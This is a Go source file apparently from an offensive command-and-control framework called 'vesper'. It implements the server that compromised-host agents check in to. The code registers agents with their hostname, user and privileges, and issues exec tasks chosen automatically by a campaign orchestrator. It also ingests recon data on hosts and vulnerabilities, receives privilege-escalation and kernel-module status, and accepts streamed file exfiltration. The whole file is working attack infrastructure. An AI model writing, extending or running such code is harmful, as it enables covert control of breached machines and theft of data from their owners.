package c2server

import (
	"context"
	"io"
	"time"

	agentv1 "github.com/ruby570bocadito/vesper/pkg/proto/gen/agent"
	"github.com/ruby570bocadito/vesper/pkg/shared/types"
)

// agentServiceServer implements agentv1.AgentServiceServer.
// It handles agent check-in, command streams, heartbeats, and exfiltration.
type agentServiceServer struct {
	agentv1.UnimplementedAgentServiceServer
	server *Server
}

// CheckIn handles agent registration with the C2 server.
func (s *agentServiceServer) CheckIn(ctx context.Context, req *agentv1.CheckInRequest) (*agentv1.CheckInResponse, error) {
	agent := s.server.HandleCheckIn(
		req.AgentId, req.Hostname, req.Os, req.Arch,
		req.Username, req.LocalIp, req.Privileges, req.PublicKey,
	)

	// Register in AppState if available
	if s.server.state != nil {
		s.server.state.RegisterAgent(agent)
		s.server.state.LogAudit(agent.ID, "", "checkin", "success", agent.Hostname)
	}

	// Convert pending tasks from campaign
	var pendingTasks []*agentv1.PendingTask
	if s.server.state != nil {
		campaigns := s.server.state.Orchestrator.ListCampaigns()
		if len(campaigns) > 0 {
			decisions, _ := s.server.state.Orchestrator.Decide(ctx, campaigns[0].ID)
			for _, d := range decisions {
				if d.Confidence > 0.7 {
					taskType := agentv1.Command_COMMAND_TYPE_EXEC
					pendingTasks = append(pendingTasks, &agentv1.PendingTask{
						TaskId:  d.ID,
						Type:    taskType,
						Payload: d.Technique,
					})
				}
			}
		}
	}

	s.server.log.Infof("agent checked in: %s (%s@%s) os=%s arch=%s",
		req.AgentId, req.Username, req.LocalIp, req.Os, req.Arch)

	return &agentv1.CheckInResponse{
		SessionId:         agent.SessionID,
		ServerPublicKey:   req.PublicKey,
		HeartbeatInterval: 30,
		PendingTasks:      pendingTasks,
	}, nil
}

// CommandStream handles bidirectional streaming between agent and C2.
func (s *agentServiceServer) CommandStream(stream agentv1.AgentService_CommandStreamServer) error {
	// Register this stream for the agent (identified on first message)
	var agentID string

	for {
		msg, err := stream.Recv()
		if err == io.EOF {
			return nil
		}
		if err != nil {
			return err
		}

		if agentID == "" && msg.SessionId != "" {
			agentID = msg.SessionId
			s.server.RegisterStream(agentID, stream)
		}

		// Process received message
		switch m := msg.Message.(type) {
		case *agentv1.AgentMessage_TaskResult:
			s.server.log.Debugf("task result from %s: success=%v output=%s",
				msg.SessionId, m.TaskResult.Success, truncateStr(m.TaskResult.Output, 100))

			if s.server.state != nil {
				s.server.state.LogAudit(msg.SessionId, "", "task_result",
					map[bool]string{true: "success", false: "failed"}[m.TaskResult.Success],
					m.TaskResult.Output)
			}

		case *agentv1.AgentMessage_ReconData:
			s.server.log.Infof("recon data from %s: %d hosts, %d vulns",
				msg.SessionId, len(m.ReconData.Hosts), len(m.ReconData.Vulns))

			if s.server.state != nil {
				for _, h := range m.ReconData.Hosts {
					s.server.state.AddHost(&types.Target{
						IP:        h.Ip,
						Hostname:  h.Hostname,
						OS:        h.Os,
						OpenPorts: convertInt32Slice(h.OpenPorts),
						Services:  h.Services,
					})
				}
				for _, v := range m.ReconData.Vulns {
					s.server.state.AddVuln(&types.Vulnerability{
						CVE:         v.Cve,
						Description: v.Description,
						Severity:    v.Severity,
						Service:     v.Service,
						Port:        int(v.Port),
						TargetIP:    m.ReconData.Target,
					})
				}
			}

		case *agentv1.AgentMessage_PrivescResult:
			s.server.log.Infof("privesc result from %s: vector=%s gained_root=%v",
				msg.SessionId, m.PrivescResult.Vector, m.PrivescResult.GainedRoot)

		case *agentv1.AgentMessage_KernelStatus:
			s.server.log.Infof("kernel status from %s: loaded=%v version=%s",
				msg.SessionId, m.KernelStatus.Loaded, m.KernelStatus.Version)

		case *agentv1.AgentMessage_Heartbeat:
			s.server.mu.Lock()
			if ac, ok := s.server.agents[msg.SessionId]; ok {
				ac.LastSeen = now()
				ac.Agent.LastCheckin = now()
			}
			s.server.mu.Unlock()
		}

		// Send heartbeat acknowledgment
		if err := stream.Send(&agentv1.ServerMessage{
			SessionId: msg.SessionId,
			Message: &agentv1.ServerMessage_Heartbeat{
				Heartbeat: &agentv1.HeartbeatResponse{
					Ok:         true,
					ServerTime: now().UnixMilli(),
				},
			},
		}); err != nil {
			return err
		}
	}
}

// Heartbeat handles unary heartbeat requests.
func (s *agentServiceServer) Heartbeat(ctx context.Context, req *agentv1.HeartbeatRequest) (*agentv1.HeartbeatResponse, error) {
	s.server.mu.Lock()
	if ac, ok := s.server.agents[req.AgentId]; ok {
		ac.LastSeen = now()
		ac.Agent.LastCheckin = now()
	}
	s.server.mu.Unlock()

	return &agentv1.HeartbeatResponse{
		Ok:         true,
		ServerTime: now().UnixMilli(),
	}, nil
}

// Exfiltrate handles file exfiltration streaming from agents.
func (s *agentServiceServer) Exfiltrate(stream agentv1.AgentService_ExfiltrateServer) error {
	var totalSize int64
	var filename string

	for {
		chunk, err := stream.Recv()
		if err == io.EOF {
			return stream.SendAndClose(&agentv1.ExfilAck{
				Received:  true,
				NextChunk: -1,
			})
		}
		if err != nil {
			return err
		}

		if filename == "" {
			filename = chunk.Filename
		}
		totalSize += int64(len(chunk.Data))
		s.server.log.Debugf("exfil chunk from %s: %s chunk=%d/%d size=%d",
			chunk.SessionId, chunk.Filename, chunk.ChunkIndex, chunk.TotalSize, len(chunk.Data))
	}
}

func convertInt32Slice(in []int32) []int {
	out := make([]int, len(in))
	for i, v := range in {
		out[i] = int(v)
	}
	return out
}

func now() time.Time { return time.Now() }

func truncateStr(s string, max int) string {
	runes := []rune(s)
	if len(runes) <= max {
		return s
	}
	return string(runes[:max]) + "..."
}
